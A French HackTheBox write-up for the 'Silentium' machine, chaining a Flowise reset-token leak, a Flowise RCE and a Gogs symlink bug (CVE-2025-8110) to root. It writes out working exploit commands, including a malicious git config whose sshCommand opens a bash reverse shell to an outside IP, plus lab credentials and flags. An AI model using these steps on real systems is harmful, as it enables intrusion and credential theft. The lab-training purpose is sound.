# Write-up -- HackTheBox : Silentium 

Write-up réalisé pour la machine Silentium de HackTheBox. La chaîne d'exploitation enchaîne trois vulnérabilités distinctes : un account takeover sans authentification sur Flowise (CVE-2025-58434), une RCE authentifiée sur ce même service (CVE-2025-59528) pour obtenir un accès root dans un conteneur Docker, puis une exploitation d'une CVE Gogs (CVE-2025-8110) via symlink pour obtenir un shell root sur la machine hôte.

L'IP de la machine pendant ma session était `10.129.38.119`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -A -sC -p- 10.129.38.119
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

Seulement **2 ports ouverts** : SSH sur le 22 et HTTP sur le 80. Le serveur redirige vers `silentium.htb`, qu'on ajoute à `/etc/hosts` :

```bash
sudo nano /etc/hosts
# 10.129.38.119   silentium.htb
```

On atterrit sur le site d'une société de finance indépendante : **Silentium**.

---

## Étape 2 -- Énumération : répertoires et sous-domaines

On commence par chercher des répertoires cachés avec gobuster. Premier essai :

```bash
gobuster dir -u http://silentium.htb/ -w /usr/share/wordlists/dirb/common.txt
```

```
the server returns a status code that matches the provided options for non existing urls.
http://silentium.htb/af85fd41-addb-4f50-a808-3d74e1ea42ed => 200 (Length: 8753)
```

Le serveur retourne systématiquement un 200 pour toutes les URLs inexistantes : c'est un **soft 404**. Il faut exclure la taille de la réponse par défaut pour filtrer le bruit :

```bash
gobuster dir -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt -xl 8753
```

```
assets  (Status: 301) [--> http://silentium.htb/assets/]
```

Rien d'intéressant, juste le dossier de ressources statiques. On passe à l'énumération des **sous-domaines** en mode vhost :

```bash
gobuster vhost -u http://silentium.htb/ \
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    --append-domain
```

```
staging.silentium.htb  Status: 200 [Size: 3142]
```

On ajoute ce sous-domaine à `/etc/hosts` et on visite `http://staging.silentium.htb/signin` : c'est une page de connexion **Flowise**, un outil d'automatisation de workflows IA.

---

## Étape 3 -- Fausse piste : injection NoSQL sur la page de login

On essaie quelques identifiants classiques sans succès. En testant des emails aléatoires, on remarque que le message d'erreur change selon que l'email existe ou non :

- Email inconnu → `"User Not Found"`
- Email valide → `"Incorrect Email or Password"`

C'est une **énumération d'utilisateurs**. En interceptant la requête POST de login dans Burp Suite, on voit que le corps est du JSON :

```json
{"email":"admin@silentium.htb","password":"zazaza"}
```

On tente une injection NoSQL dans l'onglet Repeater :

```json
{"email": {"$ne": null}, "password": {"$ne": null}}
```

On obtient bien le code d'une page d'accueil, mais à y regarder de plus près, **c'est la page d'accueil par défaut**, pas une session réelle. Ce n'est pas un accès fonctionnel.

On tente également un accès direct à l'API Flowise :

```
GET /api/v1/credentials
→ {"message":"Invalid or Missing token"}
```

Pas de chance non plus. Il faut trouver une autre approche.

---

## Étape 4 -- CVE-2025-58434 : account takeover sans authentification

En cherchant des CVE liées à Flowise, on en trouve deux particulièrement intéressantes :

- **CVE-2025-58434** : *Unauthenticated Account Takeover* : l'endpoint de réinitialisation de mot de passe retourne le token de reset directement dans la réponse API, sans authentification. N'importe qui connaissant un email valide peut prendre le contrôle du compte.
- **CVE-2025-59528** : *Authenticated RCE* : le nœud `CustomMCP` passe l'input utilisateur directement à un constructeur `Function()` avec tous les privilèges Node.js. Un utilisateur authentifié peut exécuter des commandes OS arbitraires.

On a besoin d'un email valide. En fouillant la section "Leadership" du site, on trouve trois noms. En les testant un par un sur le formulaire de login, `ben@silentium.htb` retourne `"Incorrect Email or Password"`, tiens le message est différent, c'est lui qu'on cible.

On soumet une demande de réinitialisation de mot de passe pour `ben@silentium.htb` et on intercepte la réponse dans Burp Suite :

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "XXhPrO8HBqPsfQGV3DAzZsTLulUbmWA2ETk40M3sdVGYpGbUYvq7oVLHTbxJKYBF",
    "tokenExpiry": "2026-04-22T08:01:54.134Z"
  }
}
```

Le token de reset est retourné **en clair dans la réponse**. On l'utilise directement pour définir un nouveau mot de passe : `Mdp123@!`.

On est maintenant connecté à Flowise en tant que `ben`.

---

## Étape 5 -- CVE-2025-59528 : RCE authentifiée et accès root dans le conteneur

Un dépôt GitHub (https://github.com/AzureADTrent/CVE-2025-58434-59528) fournit un exploit qui enchaîne automatiquement les deux CVE. On clône le dépôt. On récupère notre clé API depuis l'interface Flowise, on démarre un listener et on lance :

```bash
nc -lvnp 4444
```

```bash
python3 flowise_chain.py \
    -t http://staging.silentium.htb \
    --api-key hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc \
    --lhost 10.10.14.214 \
    --lport 4444
```

La connexion arrive sur le listener. Surprise : **on est directement root**, Flowise tourne dans un conteneur Docker avec l'utilisateur root.

---

## Étape 6 -- Fouille du conteneur et récupération des credentials de ben

On explore le répertoire `/root`. Dans `~/.flowise` on trouve la base de données SQLite et une clé d'encryption :

```bash
~/.flowise # ls -la
-rw-r--r--  root  385024  database.sqlite
-rw-r--r--  root      32  encryption.key
```

```
Clé d'encryption : hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc
```

En lisant l'historique des commandes shell (`~/.ash_history`), on voit qu'un utilisateur a exécuté `env`. On reproduit la commande :

```bash
env
```

La sortie des variables d'environnement contient plusieurs secrets en clair, dont :

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
```

On teste `r04D!!_R4ge` comme mot de passe SSH pour `ben` sur la machine hôte :

```bash
ssh ben@10.129.38.119
```

Ça fonctionne : **réutilisation du mot de passe** entre le service mail du conteneur et le compte système de l'hôte.

---

## Étape 7 -- Flag user

```bash
ben@silentium:~$ cat user.txt
```

**Flag user :** `821c8e04e1f4305125fe2c4177879fc6`

---

## Étape 8 -- Découverte de Gogs et de sa configuration

En fouillant `/opt`, on trouve une instance **Gogs** (un serveur Git auto-hébergé léger) : avec son fichier de configuration :

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

```ini
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR  = 127.0.0.1
HTTP_PORT  = 3001
DOMAIN     = staging-v2-code.dev.silentium.htb
ROOT_URL   = http://staging-v2-code.dev.silentium.htb/

[security]
SECRET_KEY = sdsrcxSm0iC7wDO
```

Deux points critiques : Gogs tourne en **`RUN_USER = root`**, et le service écoute uniquement sur `127.0.0.1:3001`. N'importe quelle RCE sur Gogs donnera un shell root sur la machine hôte.

---

## Étape 9 -- CVE-2025-8110 : RCE via symlink dans Gogs

La CVE-2025-8110 exploite le fait que Gogs ne valide pas les liens symboliques dans les dépôts Git lors des opérations d'édition de fichiers via l'API. En créant un symlink pointant vers `.git/config` et en utilisant l'API pour écraser ce symlink avec une config Git malveillante, on force Gogs à exécuter une commande arbitraire lors du prochain `git fetch` via SSH.

L'exploitation se fait en six étapes.

**1 — SSH tunneling pour accéder à Gogs depuis notre machine**

Le service Gogs est uniquement accessible depuis localhost. On crée un tunnel SSH :

```bash
ssh ben@10.129.38.119 -L 3001:localhost:3001
```

On peut maintenant accéder à `http://localhost:3001/`. On crée un compte `hacker:hacker` (avec le captcha), puis un dépôt nommé `pwn-repo`.

**2 — Création et push d'un dépôt contenant un symlink**

Depuis la machine hôte (en tant que `ben`) :

```bash
cd /tmp
mkdir pwn-repo && cd pwn-repo
git init
git config user.email "h@h.com"
git config user.name "h"
ln -s .git/config symlink
echo "x" > README.md
git add -A
git commit -m "init"
git push http://hacker:hacker@localhost:3001/hacker/pwn-repo.git master --force
```

Le symlink pointe vers `.git/config`, c'est la pièce maîtresse de l'exploit.

**3 -- Récupération du SHA du blob symlink via l'API**

```bash
curl -s \
  -H "Authorization: token e8e5bebae2f267fd607b433a4b3f6de9f0a60cd9" \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  "http://localhost:3001/api/v1/repos/hacker/pwn-repo/contents/symlink" \
  | python3 -m json.tool
```

```json
{
    "type": "symlink",
    "target": ".git/config",
    "sha": "74a16c50bb417b927af27e37af24480f00ed5232"
}
```

Le SHA servira à identifier le blob à écraser dans l'étape suivante.

**4 -- Création de la config Git malveillante**

On crée un fichier `bad_config` contenant une directive `sshCommand` qui ouvre un reverse shell, et on l'encode en base64 :

```bash
cat > /tmp/bad_config << 'EOF'
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.14.214/4444 0>&1'
[remote "origin"]
        url = ssh://localhost/x
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
EOF

cat /tmp/bad_config | base64 -w 0
```

**5 -- Démarrage du listener**

```bash
nc -lvnp 4444
```

**6 -- Écrasement du fichier via l'API**

On envoie un `PUT` sur le symlink avec le contenu de notre config malveillante encodé en base64. Gogs suit le symlink et écrase `.git/config` avec notre payload :

```bash
curl -X PUT \
  -H "Authorization: token e8e5bebae2f267fd607b433a4b3f6de9f0a60cd9" \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -H "Content-Type: application/json" \
  "http://localhost:3001/api/v1/repos/hacker/pwn-repo/contents/symlink" \
  -d '{
    "message": "pwn",
    "content": "W2NvcmVd...",
    "sha": "74a16c50bb417b927af27e37af24480f00ed5232"
  }' | python3 -m json.tool
```

Lors du prochain `git fetch` initié par Gogs (déclenché par l'API), Git lit la config corrompue, exécute le `sshCommand` malveillant, et la connexion arrive sur notre listener.

---

## Étape 10 -- Flag root

```bash
root@silentium:~# cat root.txt
727db5b1aef0f7905c7fffd010d0b922
```

**Flag root :** `727db5b1aef0f7905c7fffd010d0b922`
